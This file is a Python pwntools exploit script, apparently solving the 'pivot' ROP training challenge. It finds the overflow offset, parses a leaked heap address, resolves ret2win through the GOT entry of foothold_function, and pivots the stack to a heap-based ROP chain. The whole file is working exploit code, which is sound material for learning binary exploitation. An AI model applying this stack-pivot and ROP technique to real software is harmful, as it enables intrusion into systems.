from pwn import *
import os

#
# Context
#

e = context.binary = ELF('pivot')

#
# Offset
#

io = process(e.path)
io.sendlineafter(b'> ', 'poop')
io.sendlineafter(b'> ', cyclic(0x100))
io.wait()
core = io.corefile
io.close()
offset = cyclic_find(core.read(core.rsp, 4))

info(f'Offset: {offset}')

#
# Library functions offset
#

lib = ELF('libpivot.so')

lib_ret2win  = lib.symbols['ret2win']
lib_foothold = lib.symbols['foothold_function']

rtw_offset = lib_ret2win - lib_foothold

info(f'Ret2Win offset: {rtw_offset}')

#
# ROP
#

FOOTHOLD_FUNCTION_GOT   = p64(e.got['foothold_function'])
EXIT                    = p64(e.symbols['exit'])

XCHG_RAX_RSP            = p64(next(e.search(asm('xchg rax, rsp; ret;'))))
DEREF_RAX               = p64(next(e.search(asm('mov rax, qword ptr [rax]; ret;'))))
ADD_RAX_RBP             = p64(next(e.search(asm('add rax, rbp; ret;'))))
POP_RAX                 = p64(next(e.search(asm('pop rax; ret;'))))
POP_RBP                 = p64(next(e.search(asm('pop rbp; ret;'))))
CALL_RAX                = p64(next(e.search(asm('call rax;'))))

#
# Exploit
#

io = process(e.path)

# Leak heap address
heap_leak = io.recvuntil(b'\nSend').decode().split('\n')[-2].split()[-1]
info(f'Heap Leak: {heap_leak}')
heap_leak = p64(int(heap_leak[2:], 16))

heap_payload  = b''

heap_payload += POP_RAX
heap_payload += FOOTHOLD_FUNCTION_GOT
heap_payload += DEREF_RAX
heap_payload += CALL_RAX
heap_payload += b'RBPDIOCA'

heap_payload += POP_RAX
heap_payload += FOOTHOLD_FUNCTION_GOT
heap_payload += DEREF_RAX
heap_payload += POP_RBP
heap_payload += p64(rtw_offset)
heap_payload += ADD_RAX_RBP
heap_payload += CALL_RAX
heap_payload += EXIT
heap_payload += EXIT
heap_payload += b'H' * (0x100 - len(heap_payload))

stack_payload  = b''
stack_payload += b'A' * offset

stack_payload += POP_RAX
stack_payload += heap_leak
stack_payload += XCHG_RAX_RSP

io.sendafter(b'> ', heap_payload)
io.sendafter(b'> ', stack_payload)

print(io.recvrepeat(1).decode())

os.system('rm core*')